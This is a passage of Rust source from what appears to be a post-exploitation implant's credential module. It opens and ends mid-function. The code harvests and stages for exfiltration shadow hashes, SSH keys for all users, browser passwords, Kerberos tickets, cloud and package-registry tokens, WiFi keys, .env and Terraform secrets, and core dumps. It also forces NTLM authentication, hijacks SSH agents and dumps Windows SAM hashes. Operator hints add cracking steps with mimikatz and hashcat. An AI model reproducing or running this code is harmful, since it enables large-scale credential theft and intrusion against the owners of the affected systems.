                        let cache_name = trimmed.split_whitespace().next().unwrap_or("?");
                        out.push_str(&format!("    {} → present (hashcat -m 2100)\n", cache_name));
                    }
                    out.push_str(&format!("  ✓ MsCacheV2: {} entry(ies) → inline (requires SYSTEM to read SECURITY hive)\n", entries.len()));
                    inline_count += entries.len() as u32;
                }
            }
        }

    }

    #[cfg(unix)]
    {
        let _ = decrypt;
        out.push_str("[creds harvest] Linux credential scan\n");
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());

        // ── /etc/shadow (root only) ──
        if _get_uid() == 0 {
            if let Ok(shadow) = std::fs::read_to_string("/etc/shadow") {
                let entries: Vec<&str> = shadow.lines()
                    .filter(|l| !l.starts_with('#') && !l.is_empty())
                    .filter(|l| { let p = l.split(':').nth(1).unwrap_or(""); p != "*" && p != "!" && p != "!!" && !p.is_empty() })
                    .collect();
                if !entries.is_empty() {
                    out.push_str("  ─── /etc/shadow (hashed) ───\n");
                    for e in &entries { out.push_str(&format!("    {}\n", e)); }
                    out.push_str(&format!("  ✓ shadow: {} account(s) with hashes → inline\n", entries.len()));
                    inline_count += entries.len() as u32;
                }
            }
        }

        // ── SSH keys + config ──
        let ssh_dir = format!("{}/.ssh", home);
        let ssh_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                         "id_rsa.pub", "id_ed25519.pub", "config", "known_hosts"];
        let mut ssh_n = 0u32;
        let mut ssh_info = Vec::new();
        for f in &ssh_files {
            let p = format!("{}/{}", ssh_dir, f);
            if let Ok(data) = std::fs::read(&p) {
                if data.is_empty() { continue; }
                let is_pub = f.ends_with(".pub");
                let is_config = *f == "config" || *f == "known_hosts";
                let enc = if !is_pub && !is_config { _ssh_key_encrypted(&data) } else { false };
                let label = if enc { "ENCRYPTED" } else if is_pub { "public" } else if is_config { "config" } else { "PLAINTEXT" };
                ssh_info.push(format!("    {} ({})", f, label));
                if let Some(b) = _stage_file(&p, "ssh", state, transport, &mut staged) {
                    ssh_n += 1; staged_bytes += b;
                }
            }
        }
        if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("id_") && !ssh_files.contains(&name.as_str()) {
                    let p = entry.path().display().to_string();
                    if let Ok(data) = std::fs::read(&p) {
                        let enc = _ssh_key_encrypted(&data);
                        let label = if name.ends_with(".pub") { "public" } else if enc { "ENCRYPTED" } else { "PLAINTEXT" };
                        ssh_info.push(format!("    {} ({})", name, label));
                    }
                    if let Some(b) = _stage_file(&p, "ssh", state, transport, &mut staged) {
                        ssh_n += 1; staged_bytes += b;
                    }
                }
            }
        }
        if ssh_n > 0 {
            out.push_str("  ─── SSH Keys ───\n");
            for info in &ssh_info { out.push_str(&format!("{}\n", info)); }
            out.push_str(&format!("  ✓ SSH: {} file(s) → staged\n", ssh_n));
            staged_count += ssh_n;
        } else {
            out.push_str("  ✗ SSH: no keys found\n");
        }

        // ── Firefox ──
        let ff_dir = format!("{}/.mozilla/firefox", home);
        let ff_result = _harvest_firefox_parsed(&ff_dir);
        if !ff_result.is_empty() {
            out.push_str("  ─── Firefox Passwords ───\n");
            for c in &ff_result { out.push_str(&format!("    {} | {} | {}\n", c.0, c.1, c.2)); }
            out.push_str(&format!("  ✓ Firefox: {} password(s) decrypted → inline\n", ff_result.len()));
            inline_count += ff_result.len() as u32;
        } else {
            let (n, b) = _stage_firefox(&ff_dir, state, transport, &mut staged);
            if n > 0 {
                out.push_str(&format!("  ✓ Firefox: {} files ({}) → staged (master password set or parse error)\n", n, _fmt_bytes(b)));
                staged_count += n; staged_bytes += b;
                _hint_ff_masterpass = true;
            }
        }

        // ── Kerberos ccache ──
        let krb_path = std::env::var("KRB5CCNAME")
            .unwrap_or_else(|_| format!("/tmp/krb5cc_{}", _get_uid()));
        let krb_path = krb_path.trim_start_matches("FILE:").to_string();
        if let Ok(data) = std::fs::read(&krb_path) {
            if data.len() > 4 {
                let parsed = _parse_krb5_ccache(&data);
                if !parsed.is_empty() {
                    out.push_str("  ─── Kerberos Tickets ───\n");
                    out.push_str(&parsed);
                }
                if let Some(b) = _stage_file(&krb_path, "krb", state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ Kerberos ccache: ({}) → staged\n", _fmt_bytes(b)));
                    staged_count += 1; staged_bytes += b;
                }
            }
        }

        // ── Git credentials ──
        let git_paths = [
            format!("{}/.git-credentials", home),
            format!("{}/.config/git/credentials", home),
        ];
        for p in &git_paths {
            if let Ok(content) = std::fs::read_to_string(p) {
                if !content.trim().is_empty() {
                    out.push_str("  ─── Git Credentials ───\n");
                    for line in content.lines().take(20) { out.push_str(&format!("    {}\n", line)); }
                    out.push_str(&format!("  ✓ Git creds: {} → inline\n", p));
                    inline_count += 1;
                }
            }
        }

        // ── Cloud credentials (parsed inline) ──
        let cloud_files: &[(&str, &str, fn(&str) -> String)] = &[
            (&format!("{}/.aws/credentials", home), "AWS", _parse_aws_creds as fn(&str) -> String),
            (&format!("{}/.docker/config.json", home), "Docker", _parse_docker_config as fn(&str) -> String),
            (&format!("{}/.kube/config", home), "Kubernetes", _parse_kube_config as fn(&str) -> String),
        ];
        for (path, label, parser) in cloud_files {
            if let Ok(content) = std::fs::read_to_string(path) {
                if !content.trim().is_empty() {
                    let parsed = parser(&content);
                    if !parsed.is_empty() {
                        out.push_str(&format!("  ─── {} ───\n", label));
                        out.push_str(&parsed);
                        out.push_str(&format!("  ✓ {}: parsed → inline\n", label));
                        inline_count += 1;
                    }
                }
            }
        }
        // Azure + GCloud — stage raw (binary/complex format)
        let cloud_stage = [
            (format!("{}/.azure/msal_token_cache.json", home), "azure"),
            (format!("{}/.config/gcloud/credentials.db", home), "gcloud"),
        ];
        for (path, label) in &cloud_stage {
            if let Some(b) = _stage_file(path, label, state, transport, &mut staged) {
                out.push_str(&format!("  ✓ {}: ({}) → staged\n", label, _fmt_bytes(b)));
                staged_count += 1; staged_bytes += b;
            }
        }

        // ── GNOME Keyring ──
        let keyring_dir = format!("{}/.local/share/keyrings", home);
        let (n, b) = _stage_dir_files(&keyring_dir, "keyring", state, transport, &mut staged);
        if n > 0 {
            out.push_str(&format!("  ✓ GNOME keyring: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── NetworkManager WiFi (needs root) ──
        let nm_dir = "/etc/NetworkManager/system-connections";
        if let Ok(entries) = std::fs::read_dir(nm_dir) {
            let mut nm_count = 0u32;
            for entry in entries.flatten() {
                if let Ok(content) = std::fs::read_to_string(entry.path()) {
                    let ssid = content.lines().find(|l| l.starts_with("ssid=")).map(|l| &l[5..]).unwrap_or("?");
                    let psk = content.lines().find(|l| l.starts_with("psk=")).map(|l| &l[4..]);
                    if let Some(key) = psk {
                        if nm_count == 0 { out.push_str("  ─── WiFi (NetworkManager) ───\n"); }
                        out.push_str(&format!("    {} → {}\n", ssid, key));
                        nm_count += 1;
                    }
                }
            }
            if nm_count > 0 {
                out.push_str(&format!("  ✓ WiFi: {} profile(s) → inline\n", nm_count));
                inline_count += nm_count;
            }
        }

        // ── SSSD cache (needs root) ──
        let sssd_dir = "/var/lib/sss/db";
        let (n, b) = _stage_glob(sssd_dir, "cache_*.ldb", "sssd", state, transport, &mut staged);
        if n > 0 {
            out.push_str(&format!("  ✓ SSSD cache: {} files ({}) → staged\n", n, _fmt_bytes(b)));
            staged_count += n; staged_bytes += b;
        }

        // ── History grep for secrets ──
        let hist_secrets = _grep_history_secrets(&home);
        if !hist_secrets.is_empty() {
            out.push_str(&format!("  ─── History Secrets ───\n"));
            let capped: String = hist_secrets.lines().take(50).collect::<Vec<_>>().join("\n");
            out.push_str(&capped);
            out.push_str(&format!("\n  ✓ History: {} line(s) → inline\n", hist_secrets.lines().count().min(50)));
            inline_count += 1;
        }

        // ── All users SSH keys (root-only expansion) ──
        if _get_uid() == 0 {
            let mut extra_ssh = 0u32;
            if let Ok(entries) = std::fs::read_dir("/home") {
                for entry in entries.flatten() {
                    let user_ssh = format!("{}/.ssh", entry.path().display());
                    if !std::path::Path::new(&user_ssh).exists() { continue; }
                    let username = entry.file_name().to_string_lossy().to_string();
                    if let Ok(files) = std::fs::read_dir(&user_ssh) {
                        for f in files.flatten() {
                            let fname = f.file_name().to_string_lossy().to_string();
                            if fname.starts_with("id_") && !fname.ends_with(".pub") {
                                let p = f.path().to_string_lossy().to_string();
                                if let Some(b) = _stage_file(&p, &format!("ssh_{}", username), state, transport, &mut staged) {
                                    out.push_str(&format!("  ✓ SSH key ({}/{}): ({}) → staged\n", username, fname, _fmt_bytes(b)));
                                    staged_count += 1; staged_bytes += b;
                                    extra_ssh += 1;
                                }
                            }
                            if fname == "authorized_keys" || fname == "known_hosts" {
                                let p = f.path().to_string_lossy().to_string();
                                if let Some(b) = _stage_file(&p, &format!("ssh_{}", username), state, transport, &mut staged) {
                                    out.push_str(&format!("  ✓ SSH {} ({}): ({}) → staged\n", fname, username, _fmt_bytes(b)));
                                    staged_count += 1; staged_bytes += b;
                                    extra_ssh += 1;
                                }
                            }
                        }
                    }
                }
            }
            // root's own SSH
            if std::path::Path::new("/root/.ssh").exists() {
                if let Ok(files) = std::fs::read_dir("/root/.ssh") {
                    for f in files.flatten() {
                        let fname = f.file_name().to_string_lossy().to_string();
                        if (fname.starts_with("id_") && !fname.ends_with(".pub")) || fname == "authorized_keys" || fname == "known_hosts" {
                            let p = f.path().to_string_lossy().to_string();
                            if let Some(b) = _stage_file(&p, "ssh_root", state, transport, &mut staged) {
                                out.push_str(&format!("  ✓ SSH {} (root): ({}) → staged\n", fname, _fmt_bytes(b)));
                                staged_count += 1; staged_bytes += b;
                                extra_ssh += 1;
                            }
                        }
                    }
                }
            }
            if extra_ssh > 0 {
                out.push_str(&format!("  ✓ All-users SSH: {} file(s) → staged\n", extra_ssh));
            }
        }

        // ── All users Kerberos ccache (root, /tmp/krb5cc_*) ──
        if _get_uid() == 0 {
            if let Ok(entries) = std::fs::read_dir("/tmp") {
                let mut krb_extra = 0u32;
                for entry in entries.flatten() {
                    let fname = entry.file_name().to_string_lossy().to_string();
                    if fname.starts_with("krb5cc_") {
                        let p = entry.path().to_string_lossy().to_string();
                        if let Some(b) = _stage_file(&p, "krbcc", state, transport, &mut staged) {
                            out.push_str(&format!("  ✓ Kerberos ccache: {} ({}) → staged\n", fname, _fmt_bytes(b)));
                            staged_count += 1; staged_bytes += b;
                            krb_extra += 1;
                        }
                    }
                }
                if krb_extra > 0 {
                    out.push_str(&format!("  ✓ All-users ccache: {} file(s) → staged\n", krb_extra));
                }
            }
        }

        // ── Keytab files ──
        let keytab_paths = ["/etc/krb5.keytab", "/etc/security/keytabs"];
        for kp in &keytab_paths {
            let p = std::path::Path::new(kp);
            if p.is_file() {
                if let Some(b) = _stage_file(kp, "keytab", state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ Keytab: {} ({}) → staged (extract: klist -k {})\n", kp, _fmt_bytes(b), kp));
                    staged_count += 1; staged_bytes += b;
                }
            } else if p.is_dir() {
                if let (n, b) = _stage_dir_files(kp, "keytab", state, transport, &mut staged) {
                    if n > 0 {
                        out.push_str(&format!("  ✓ Keytab dir: {} file(s) ({}) → staged\n", n, _fmt_bytes(b)));
                        staged_count += n; staged_bytes += b;
                    }
                }
            }
        }

        // ── /etc/security/opasswd (PAM old passwords) ──
        if let Ok(content) = std::fs::read_to_string("/etc/security/opasswd") {
            let entries: Vec<&str> = content.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')).collect();
            if !entries.is_empty() {
                out.push_str("  ─── /etc/security/opasswd ───\n");
                for e in entries.iter().take(30) { out.push_str(&format!("    {}\n", e)); }
                out.push_str(&format!("  ✓ opasswd: {} entry(ies) → inline (old password hashes, crackable)\n", entries.len()));
                inline_count += entries.len() as u32;
            }
        }

        // ── Chromium on Linux (Chrome/Chromium/Edge) ──
        let linux_browsers: &[(&str, &str, &str)] = &[
            ("Chrome", &format!("{}/.config/google-chrome/Default", home), "chrome_linux"),
            ("Chromium", &format!("{}/.config/chromium/Default", home), "chromium_linux"),
            ("Edge", &format!("{}/.config/microsoft-edge/Default", home), "edge_linux"),
        ];
        for (name, base, prefix) in linux_browsers {
            let login_path = format!("{}/Login Data", base);
            if std::path::Path::new(&login_path).exists() {
                if let Some(b) = _stage_file(&login_path, prefix, state, transport, &mut staged) {
                    out.push_str(&format!("  ✓ {} Login Data (Linux): ({}) → staged\n", name, _fmt_bytes(b)));
                    staged_count += 1; staged_bytes += b;
                }
                let local_state = format!("{}/../Local State", base);
                if std::path::Path::new(&local_state).exists() {
                    if let Some(b) = _stage_file(&local_state, prefix, state, transport, &mut staged) {
                        out.push_str(&format!("  ✓ {} Local State: ({}) → staged (AES key, GNOME Keyring-wrapped or 'peanuts' fallback)\n", name, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                    }
                }
            }
        }

        // ── Config file credential search ──
        let config_files: &[(&str, &str)] = &[
            (&format!("{}/.pgpass", home), "pgpass"),
            (&format!("{}/.my.cnf", home), "mycnf"),
            ("/etc/mysql/debian.cnf", "debian_cnf"),
            (&format!("{}/.netrc", home), "netrc"),
            (&format!("{}/.s3cfg", home), "s3cfg"),
            (&format!("{}/.passwd-s3fs", home), "s3fs"),
        ];
        for (path, label) in config_files {
            if let Ok(content) = std::fs::read_to_string(path) {
                if !content.trim().is_empty() {
                    if let Some(b) = _stage_file(path, label, state, transport, &mut staged) {
                        out.push_str(&format!("  ✓ {}: ({}) → staged\n", path, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                    }
                }
            }
        }
        // wp-config.php search in common web roots
        for webroot in &["/var/www", "/srv/www", "/opt"] {
            if let Ok(walker) = _find_files_by_name(webroot, "wp-config.php", 3) {
                for f in walker.iter().take(5) {
                    if let Ok(content) = std::fs::read_to_string(f) {
                        if content.contains("DB_PASSWORD") {
                            if let Some(b) = _stage_file(f, "wpconfig", state, transport, &mut staged) {
                                out.push_str(&format!("  ✓ wp-config.php: {} ({}) → staged\n", f, _fmt_bytes(b)));
                                staged_count += 1; staged_bytes += b;
                            }
                        }
                    }
                }
            }
        }

        // ── .env files (Linux) ──
        let env_search_dirs_unix = ["/var/www", "/opt", &home];
        let mut env_found_unix = 0u32;
        for dir in &env_search_dirs_unix {
            if let Ok(walker) = _find_files_by_name(dir, ".env", 4) {
                for f in walker.iter().take(10) {
                    if let Ok(content) = std::fs::read_to_string(f) {
                        let lower = content.to_lowercase();
                        if lower.contains("password") || lower.contains("secret") || lower.contains("api_key") || lower.contains("token=") {
                            if let Some(b) = _stage_file(f, "dotenv", state, transport, &mut staged) {
                                if env_found_unix == 0 { out.push_str("  ─── .env Files ───\n"); }
                                out.push_str(&format!("    {} ({}) → staged\n", f, _fmt_bytes(b)));
                                staged_count += 1; staged_bytes += b;
                                env_found_unix += 1;
                                if env_found_unix >= 10 { break; }
                            }
                        }
                    }
                }
            }
            if env_found_unix >= 10 { break; }
        }
        if env_found_unix > 0 { out.push_str(&format!("  ✓ .env: {} file(s) with secrets → staged\n", env_found_unix)); }

        // ── npm/pip/gem tokens ──
        let token_files: &[(&str, &str)] = &[
            (&format!("{}/.npmrc", home), "npmrc"),
            (&format!("{}/.yarnrc", home), "yarnrc"),
            (&format!("{}/.pypirc", home), "pypirc"),
            (&format!("{}/.gem/credentials", home), "gem_creds"),
            (&format!("{}/.composer/auth.json", home), "composer_auth"),
        ];
        for (path, label) in token_files {
            if let Ok(content) = std::fs::read_to_string(path) {
                let lower = content.to_lowercase();
                if lower.contains("token") || lower.contains("password") || lower.contains("auth") || lower.contains("_authtoken") {
                    if let Some(b) = _stage_file(path, label, state, transport, &mut staged) {
                        out.push_str(&format!("  ✓ {}: ({}) → staged (package registry tokens)\n", path, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                    }
                }
            }
        }

        // ── Terraform state files (Linux) ──
        let tf_search_unix = [&home, "/opt", "/var/lib"];
        let mut tf_found_unix = 0u32;
        for dir in &tf_search_unix {
            if let Ok(walker) = _find_files_by_ext(dir, "tfstate", 3) {
                for f in walker.iter().take(5) {
                    if let Some(b) = _stage_file(f, "terraform", state, transport, &mut staged) {
                        if tf_found_unix == 0 { out.push_str("  ─── Terraform State ───\n"); }
                        out.push_str(&format!("    {} ({}) → staged\n", f, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                        tf_found_unix += 1;
                    }
                }
            }
            if tf_found_unix >= 5 { break; }
        }
        if tf_found_unix > 0 { out.push_str(&format!("  ✓ Terraform: {} state file(s) → staged\n", tf_found_unix)); }

        // ── Core dumps ──
        let coredump_dirs = ["/var/crash", "/var/lib/systemd/coredump"];
        for dir in &coredump_dirs {
            if std::path::Path::new(dir).is_dir() {
                if let Ok(entries) = std::fs::read_dir(dir) {
                    let mut cd_found = 0u32;
                    for entry in entries.flatten().take(5) {
                        let p = entry.path().to_string_lossy().to_string();
                        if let Ok(meta) = entry.metadata() {
                            if meta.len() > 0 && meta.len() < 50 * 1024 * 1024 {
                                if let Some(b) = _stage_file(&p, "coredump", state, transport, &mut staged) {
                                    out.push_str(&format!("  ✓ Core dump: {} ({}) → staged\n", p, _fmt_bytes(b)));
                                    staged_count += 1; staged_bytes += b;
                                    cd_found += 1;
                                }
                            }
                        }
                    }
                    if cd_found > 0 {
                        out.push_str(&format!("  ✓ Core dumps from {}: {} file(s) → staged (search for creds: strings <file> | grep -i pass)\n", dir, cd_found));
                    }
                }
            }
        }

        // ── Systemd service secrets ──
        let service_dirs = ["/etc/systemd/system", "/usr/lib/systemd/system"];
        let mut svc_secrets = 0u32;
        for dir in &service_dirs {
            if let Ok(entries) = std::fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let fname = entry.file_name().to_string_lossy().to_string();
                    if !fname.ends_with(".service") { continue; }
                    if let Ok(content) = std::fs::read_to_string(entry.path()) {
                        let lower = content.to_lowercase();
                        if lower.contains("password") || lower.contains("secret") || lower.contains("api_key") || lower.contains("token=") {
                            let p = entry.path().to_string_lossy().to_string();
                            if let Some(b) = _stage_file(&p, "svc_secret", state, transport, &mut staged) {
                                if svc_secrets == 0 { out.push_str("  ─── Systemd Services with Secrets ───\n"); }
                                out.push_str(&format!("    {} ({}) → staged\n", fname, _fmt_bytes(b)));
                                staged_count += 1; staged_bytes += b;
                                svc_secrets += 1;
                            }
                        }
                    }
                }
            }
        }
        if svc_secrets > 0 { out.push_str(&format!("  ✓ Systemd: {} service(s) with embedded secrets → staged\n", svc_secrets)); }

        // ── KWallet ──
        let kwallet_dir = format!("{}/.local/share/kwalletd", home);
        if std::path::Path::new(&kwallet_dir).is_dir() {
            let (n, b) = _stage_dir_files(&kwallet_dir, "kwallet", state, transport, &mut staged);
            if n > 0 {
                out.push_str(&format!("  ✓ KWallet: {} file(s) ({}) → staged (decrypt: kwallet-query, kwalletmanager)\n", n, _fmt_bytes(b)));
                staged_count += n; staged_bytes += b;
            }
        }

        // ── Ansible vault files ──
        let ansible_dirs = [
            &format!("{}/.ansible", home),
            "/etc/ansible",
            "/opt/ansible",
        ];
        let mut ansible_found = 0u32;
        for dir in &ansible_dirs {
            if let Ok(walker) = _find_files_containing(dir, "$ANSIBLE_VAULT", 3) {
                for f in walker.iter().take(5) {
                    if let Some(b) = _stage_file(f, "ansible_vault", state, transport, &mut staged) {
                        if ansible_found == 0 { out.push_str("  ─── Ansible Vault ───\n"); }
                        out.push_str(&format!("    {} ({}) → staged\n", f, _fmt_bytes(b)));
                        staged_count += 1; staged_bytes += b;
                        ansible_found += 1;
                    }
                }
            }
            if ansible_found >= 5 { break; }
        }
        if ansible_found > 0 { out.push_str(&format!("  ✓ Ansible: {} vault file(s) → staged (crack: ansible2john + hashcat -m 16900)\n", ansible_found)); }

        // ── HashiCorp Vault token ──
        let vault_token = format!("{}/.vault-token", home);
        if let Ok(token) = std::fs::read_to_string(&vault_token) {
            let t = token.trim();
            if !t.is_empty() {
                out.push_str(&format!("  ✓ HashiCorp Vault token: {}...{} → inline\n",
                    &t[..t.len().min(8)],
                    if t.len() > 12 { &t[t.len()-4..] } else { "" }
                ));
                inline_count += 1;
            }
        }

    }

    out.push_str(&format!("\n  Summary: {} inline, {} staged ({} total)\n", inline_count, staged_count, _fmt_bytes(staged_bytes)));

    let mut hints: Vec<&str> = Vec::new();
    if _hint_no_decrypt && staged_count > 0 {
        hints.push("Try /creds harvest decrypt to attempt DPAPI decryption on-target (OPSEC: calls CryptUnprotectData)");
    }
    if _hint_dpapi_nodecrypt {
        hints.push("DPAPI not decryptable (different logon session) → exfil blob+masterkey from Artifacts, then: mimikatz dpapi::masterkey /in:mk /password:userpass OR DPAPImk2john + hashcat -m 15900");
    }
    if _hint_dpapi_staged {
        hints.push("DPAPI blobs staged → after exfil, decrypt offline: mimikatz dpapi::cred /in:blob /masterkey:KEY or with domain backup key");
    }
    if _hint_ff_masterpass {
        hints.push("Firefox master password blocks inline decrypt → after exfil: firefox_decrypt --pass '' key4.db logins.json, or hashcat -m 26100 on key4.db");
    }
    if _hint_browser_staged {
        hints.push("Chrome/Edge Login Data staged → after exfil, decrypt offline with Local State AES key (DPAPI-wrapped) + sqlite3");
    }
    if _hint_mremoteng_staged {
        hints.push("mRemoteNG confCons.xml staged → decrypt offline: default key is 'mR3m' (AES-GCM, PBKDF2-SHA1 1000 rounds)");
    }
    if _hint_unattend_staged {
        hints.push("Unattend/Sysprep XML with embedded credentials staged → check for base64-encoded passwords (decode with: echo <b64> | base64 -d)");
    }
    if staged_count > 0 {
        hints.push("Staged files appear in Artifacts tab after cloud sync");
    }
    if !hints.is_empty() {
        out.push_str("\n  ─── Hints ───\n");
        for h in &hints {
            out.push_str(&format!("  → {}\n", h));
        }
    }

    (out, staged)
}

// ══════════════════════════════════════════════════════════════════════════════
// § COERCE — forced local authentication to capture hashes/credentials
// ══════════════════════════════════════════════════════════════════════════════

pub fn coerce() -> String {
    let mut out = String::new();

    #[cfg(windows)]
    {
        out.push_str("[creds coerce] Named pipe coercion\n");
        match _coerce_spoolsample_local() {
            Ok(hash) => {
                out.push_str("  ✓ SpoolSample (MS-RPRN) local coercion succeeded\n");
                out.push_str("  ✓ NetNTLMv2 captured:\n\n");
                out.push_str(&hash);
                out.push_str("\n\n  Format: NetNTLMv2 (hashcat -m 5600)\n");
            }
            Err(e) => {
                out.push_str(&format!("  ✗ SpoolSample failed: {}\n", e));
                // Fallback: try EfsRpc
                match _coerce_efsrpc_local() {
                    Ok(hash) => {
                        out.push_str("  ✓ EfsRpc (MS-EFSR) local coercion succeeded\n");
                        out.push_str("  ✓ NetNTLMv2 captured:\n\n");
                        out.push_str(&hash);
                        out.push_str("\n\n  Format: NetNTLMv2 (hashcat -m 5600)\n");
                    }
                    Err(e2) => {
                        out.push_str(&format!("  ✗ EfsRpc failed: {}\n", e2));
                        out.push_str("  No coercion method succeeded.\n");
                    }
                }
            }
        }
    }

    #[cfg(unix)]
    {
        out.push_str("[creds coerce] SSH agent hijack + Kerberos\n");

        // ── SSH Agent Hijack ──
        let agents = _find_ssh_agents();
        if agents.is_empty() {
            out.push_str("  ✗ No SSH agents found\n");
        } else {
            out.push_str(&format!("  SSH agents found: {}\n", agents.len()));
            for agent in &agents {
                out.push_str(&format!("    ✓ user={} pid={} sock={}\n", agent.user, agent.pid, agent.sock));
                match _ssh_agent_list_keys(&agent.sock) {
                    Ok(keys) => {
                        out.push_str(&format!("      Keys: {}\n", keys.len()));
                        for k in &keys {
                            out.push_str(&format!("        {} {}\n", k.key_type, k.comment));
                        }
                        out.push_str("      Agent usable: yes\n");
                    }
                    Err(e) => out.push_str(&format!("      Error listing keys: {}\n", e)),
                }
            }
        }

        // ── Kerberos ccache check ──
        let krb_path = std::env::var("KRB5CCNAME")
            .unwrap_or_else(|_| format!("/tmp/krb5cc_{}", _get_uid()));
        let krb_path = krb_path.trim_start_matches("FILE:").to_string();
        if std::path::Path::new(&krb_path).exists() {
            if let Ok(meta) = std::fs::metadata(&krb_path) {
                out.push_str(&format!("  ✓ Kerberos ccache: {} ({} bytes)\n", krb_path, meta.len()));
                out.push_str("    (already staged by /creds harvest if run)\n");
            }
        } else {
            out.push_str("  ✗ No Kerberos ccache found\n");
        }
    }

    out
}

// ══════════════════════════════════════════════════════════════════════════════
// § SAM — Windows SAM/SYSTEM/SECURITY hive dump (requires SYSTEM)
// ══════════════════════════════════════════════════════════════════════════════

pub fn sam(_state: &Arc<AgentState>, _transport: &SharedTransport) -> (String, Vec<crate::protocol::StagedFile>) {
    #[cfg(unix)]
    {
        return ("[creds sam] This command is Windows-only. Use 'cat /etc/shadow' from shell on Linux.".to_string(), vec![]);
    }

    #[cfg(windows)]
    {
        let mut out = String::from("[creds sam] In-memory SAM extraction\n");

        if !_is_system_or_admin() {
            out.push_str("  ✗ Error: requires SYSTEM or elevated Administrator privileges\n");
            return (out, vec![]);
        }
        out.push_str("  Privilege: elevated ✓\n");
        out.push_str("  Method: registry API (no files, no child processes)\n");

        match _sam_in_memory() {
            Ok(hashes) => {
                if hashes.is_empty() {
                    out.push_str("  ✗ No user hashes found\n");
                } else {
                    out.push_str(&format!("  ✓ {} account(s) extracted\n\n", hashes.len()));
                    for h in &hashes {
                        out.push_str(&format!("  {}:{}:{}:{}:::\n", h.0, h.1, h.2, h.3));
                    }
                }
            }
            Err(e) => {
                out.push_str(&format!("  ✗ {}\n", e));
            }
        }
        (out, vec![])
    }
}

#[cfg(windows)]
fn _sam_in_memory() -> Result<Vec<(String, u32, String, String)>, String> {
    use std::ptr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    #[allow(non_snake_case)]
    mod w {
        pub type HKEY = isize;
        pub const HKEY_LOCAL_MACHINE: HKEY = -2147483646;
        pub const KEY_READ: u32 = 0x20019;
        pub const KEY_ENUMERATE_SUB_KEYS: u32 = 0x0008;
        pub const KEY_QUERY_VALUE: u32 = 0x0001;
        pub const REG_OPTION_BACKUP_RESTORE: u32 = 0x00000004;

        #[repr(C)]
        pub struct VALENTW {
            pub ve_valuename: *mut u16,
            pub ve_valuelen: u32,
            pub ve_valueptr: usize,
            pub ve_type: u32,
        }

        pub unsafe fn RegOpenKeyExW(key: HKEY, sub: *const u16, opts: u32, sam: u32, result: *mut HKEY) -> i32 {
            crate::dynapi::reg_open_key_ex_w(key, sub, opts, sam, result)
        }
        pub unsafe fn RegCloseKey(key: HKEY) -> i32 {
            crate::dynapi::reg_close_key(key)
        }
        pub unsafe fn RegQueryInfoKeyW(key: HKEY, class: *mut u16, class_len: *mut u32,
            reserved: *mut u32, sub_keys: *mut u32, max_sub: *mut u32,
            max_class: *mut u32, values: *mut u32, max_val_name: *mut u32,
            max_val_data: *mut u32, sec: *mut u32, last_write: *mut u64) -> i32 {
            crate::dynapi::reg_query_info_key_w(key, class, class_len, reserved, sub_keys, max_sub, max_class, values, max_val_name, max_val_data, sec, last_write)
        }
        pub unsafe fn RegEnumKeyExW(key: HKEY, idx: u32, name: *mut u16, name_len: *mut u32,
            reserved: *mut u32, class: *mut u16, class_len: *mut u32,
            last_write: *mut u64) -> i32 {
            crate::dynapi::reg_enum_key_ex_w(key, idx, name, name_len, reserved, class, class_len, last_write)
        }
        pub unsafe fn RegQueryMultipleValuesW(key: HKEY, list: *mut VALENTW, num: u32,
            buf: *mut u8, buf_size: *mut u32) -> i32 {
            crate::dynapi::reg_query_multiple_values_w(key, list as *mut u8, num, buf, buf_size)
        }
    }

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    fn reg_open(parent: w::HKEY, sub: &str, access: u32) -> Result<w::HKEY, String> {
        let ws = wide(sub);
        let mut hk: w::HKEY = 0;
        let r = unsafe { w::RegOpenKeyExW(parent, ws.as_ptr(), w::REG_OPTION_BACKUP_RESTORE, access, &mut hk) };
        if r == 0 { Ok(hk) } else { Err(format!("RegOpenKeyExW failed on '{}': 0x{:08x}", sub, r)) }
    }

    fn reg_close(hk: w::HKEY) { unsafe { w::RegCloseKey(hk); } }

    fn reg_query_class(hk: w::HKEY) -> Result<String, String> {
        let mut class_buf = [0u16; 256];
        let mut class_len = class_buf.len() as u32;
        let r = unsafe {
            w::RegQueryInfoKeyW(hk, class_buf.as_mut_ptr(), &mut class_len,
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut())
        };
        if r != 0 { return Err(format!("RegQueryInfoKeyW class failed: 0x{:08x}", r)); }
        Ok(String::from_utf16_lossy(&class_buf[..class_len as usize]))
    }

    fn reg_read_value(hk: w::HKEY, name: &str) -> Result<Vec<u8>, String> {
        let mut wn: Vec<u16> = wide(name);
        let mut val = w::VALENTW { ve_valuename: wn.as_mut_ptr(), ve_valuelen: 0, ve_valueptr: 0, ve_type: 0 };
        let mut buf = vec![0u8; 1024 * 1024];
        let mut buf_size = buf.len() as u32;
        let r = unsafe { w::RegQueryMultipleValuesW(hk, &mut val, 1, buf.as_mut_ptr(), &mut buf_size) };
        if r == 234 {
            buf.resize(buf_size as usize, 0);
            wn = wide(name);
            val.ve_valuename = wn.as_mut_ptr();
            val.ve_valuelen = 0; val.ve_valueptr = 0; val.ve_type = 0;
            let r2 = unsafe { w::RegQueryMultipleValuesW(hk, &mut val, 1, buf.as_mut_ptr(), &mut buf_size) };
            if r2 != 0 { return Err(format!("RegQueryMultipleValuesW retry failed for '{}': 0x{:08x}", name, r2)); }
        } else if r != 0 {
            return Err(format!("RegQueryMultipleValuesW failed for '{}': 0x{:08x}", name, r));
        }
        let offset = val.ve_valueptr.wrapping_sub(buf.as_ptr() as usize);
